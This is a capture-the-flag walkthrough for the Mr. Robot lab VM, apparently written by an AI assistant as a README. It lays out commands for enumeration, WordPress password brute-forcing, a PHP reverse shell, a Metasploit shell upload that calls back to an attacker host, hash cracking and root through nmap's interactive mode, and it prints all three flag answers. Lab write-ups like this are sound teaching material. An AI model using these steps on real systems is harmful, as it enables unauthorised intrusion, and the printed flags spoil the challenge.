Sure, here's an expanded and more detailed version of each step to provide more clarity and context. 

---

# Exploitation Walkthrough: Mr. Robot VM

This report details the exploitation process for the **Mr. Robot CTF** virtual machine. The target machine simulates a vulnerable Ubuntu server running WordPress 4.3.1. Below is a step-by-step explanation of the enumeration, exploitation, and privilege escalation processes that led to the full compromise of the system.

---

## Table of Contents

- [Target Information](#target-information)
- [Step 1: Identifying the Target](#step-1-identifying-the-target)
- [Step 2: Initial Scanning](#step-2-initial-scanning)
- [Step 3: WordPress Enumeration](#step-3-wordpress-enumeration)
- [Step 4: Exploiting WordPress](#step-4-exploiting-wordpress)
  - [Manual Reverse Shell](#manual-reverse-shell)
  - [Reverse Shell via Metasploit](#reverse-shell-via-metasploit)
- [Step 5: Privilege Escalation](#step-5-privilege-escalation)
- [Step 6: Final Steps to Root](#step-6-final-steps-to-root)
- [Conclusion](#conclusion)

---

## Target Information

- **Operating System:** Ubuntu 14.04  
- **Application:** WordPress 4.3.1  
- **IP Address:** Dynamic (identified via enumeration)  
- **Objective:** Capture all three keys to complete the challenge.  

---

## Step 1: Identifying the Target

### Retrieving the MAC Address
We began by inspecting the VM's settings to retrieve its **MAC address**. This is found under the **Bridge Adapter** settings in Advanced Mode:
```
XX:XX:XX:XX:XX:XX
```

### Finding the Target's IP Address
To identify the IP address associated with the MAC address, we used the `arp -a` command. This command lists the IP-to-MAC mappings on the local network.

Additionally, a subnet scan using **Nmap** was performed:
```bash
nmap -sn X.X.X.0/24
```
This scan lists all active hosts on the subnet. Results revealed:
```
X.X.X.1
X.X.X.112
X.X.X.163
X.X.X.number
```
The target machine was identified at `X.X.X.number`.

### Setting the IP as a Variable
To simplify future commands:
```bash
export ip=X.X.X.number
```

---

## Step 2: Initial Scanning

### Nmap Scan
A detailed scan of the target was conducted using Nmap to identify open ports, running services, and the underlying OS:
```bash
nmap -A -p- -v $ip
```
Findings:
- **Ports Open:** 80 (HTTP), 443 (HTTPS)
- **Services:** Apache HTTPD
- **OS:** Linux kernel 3.x - 4.x

This indicated a web server running on the target.

### Nikto Scan
To gain more details about the web server's configuration and vulnerabilities, we used Nikto:
```bash
nikto -h http://$ip
```
Findings:
- `/wp-login/`: WordPress login page detected.
- `/#wp-config.php#`: Configuration file, which could contain sensitive information.

### Directory Brute Forcing
We used **Dirb** to enumerate directories and files:
```bash
dirb http://$ip:80
```
Results included:
- `/fsocity.dic`: A wordlist file (useful for brute-forcing).
- `/key-1-of-3.txt`: A file containing the first key:  
  `073403c8a58a1f80d943455fb30724b9`

### Wordlist Processing
The `fsocity.dic` file contained duplicates, so we cleaned it for use:
```bash
sort -u fsocity.dic -o fsocity_unique.dic
wc -l fsocity_unique.dic
```
Result: **11,451 unique words**

---

## Step 3: WordPress Enumeration

### Enumerating Users
WordPress user enumeration was conducted using WPScan:
```bash
wpscan --url http://$ip --enumerate u
```
Findings:
- **Username:** `Elliot`

### Brute-Forcing the Password
Using the cleaned wordlist, we brute-forced the password:
```bash
wpscan --url http://$ip --usernames Elliot --passwords fsocity_unique.dic
```
Credentials found:
- **Username:** Elliot  
- **Password:** ER28-0652

---

## Step 4: Exploiting WordPress

### Manual Reverse Shell
1. We accessed the WordPress admin panel using Elliot's credentials at `/wp-login/`. 
2. In the admin panel, we modified the WordPress theme file (`archive.php`) to include a PHP reverse shell script. [You can use a pre-written script like this one.](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
3. On the attacker machine, we started a listener:
   ```bash
   nc -lvnp 4444
   ```
4. After navigating to the modified file in the browser, the reverse shell was successfully opened.

### Reverse Shell via Metasploit
Alternatively, we used Metasploit to automate the reverse shell process:
1. Launch Metasploit:
   ```bash
   msfconsole
   ```
2. Use the `wp_admin_shell_upload` module:
   ```bash
   use exploit/unix/webapp/wp_admin_shell_upload
   ```
3. Set the required options:
   ```bash
   set RHOSTS X.X.X.number
   set TARGETURI /wordpress
   set USERNAME Elliot
   set PASSWORD ER28-0652
   set LHOST X.X.X.your_ip
   set LPORT 4444
   ```
4. Run the exploit:
   ```bash
   exploit
   ```
5. A reverse shell was successfully established.

### Stabilizing the Shell
Regardless of the method used, stabilize the shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 5: Privilege Escalation

### Cracking the Robot User Hash
In `/home/robot`, we discovered:
- `password.raw-md5`: `robot:c3fcd3d76192e4007dfb496cca67e13b`

Using **hashcat** to crack the MD5 hash:
```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot.hashes.txt
hashcat -m 0 -a 0 robot.hashes.txt /usr/share/wordlists/rockyou.txt
```
Result:
- **Password:** `abcdefghijklmnopqrstuvwxyz`

### Switching to Robot User
```bash
su robot
```
We gained access to `robot` and retrieved the second key:
`822c73956184f694993bede3eb39f959`

---

## Step 6: Final Steps to Root

### Accessing the Root Directory
As the `robot` user, access to `/root` was denied.

### Exploiting Nmap Interactive Mode
Reverting to `Elliot`, we used an interactive feature in Nmap to access `/root`:
1. Launch Nmap in interactive mode:
   ```bash
   nmap --interactive
   ```
2. From the interactive shell:
   ```bash
   !sh
   cd /root
   ls
   ```
3. Retrieved the third key:  
   `04787ddef27c3dee1ee161b21670b4e4`

---

## Conclusion

With the discovery of the final key, the **Mr. Robot VM** was fully exploited. This exercise demonstrated:
- Effective enumeration with tools like Nmap and Dirb.
- Exploitation of WordPress vulnerabilities manually and using Metasploit.
- Privilege escalation via hash cracking and leveraging system tools like Nmap.

---

**Keys Captured:**
1. `073403c8a58a1f80d943455fb30724b9`
2. `822c73956184f694993bede3eb39f959`
3. `04787ddef27c3dee1ee161b21670b4e4`

---

This concludes the journey of owning the **Mr. Robot VM** and gaining valuable insights into system exploitation.

--- 

You can use this as your README.md file for GitHub. Let me know if you need any further refinements!
